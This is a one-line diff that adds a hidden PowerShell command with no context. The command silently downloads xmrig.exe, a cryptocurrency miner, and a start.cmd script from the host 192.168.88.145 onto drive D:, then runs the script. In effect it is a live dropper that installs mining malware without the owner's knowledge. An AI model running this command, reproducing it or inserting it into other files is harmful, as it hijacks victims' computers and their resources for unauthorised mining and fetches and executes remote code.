@@ -1,0 +1,1 @@
+powershell -w hidden -nop -c Invoke-Expression (New-Object Net.WebClient).DownloadFile('http://192.168.88.145/xmrig.exe','D:\\xmrig.exe');Invoke-Expression (New-Object Net.WebClient).DownloadFile('http://192.168.88.145/start.cmd','D:\\start.cmd');start-process -filePath D:\\start.cmd
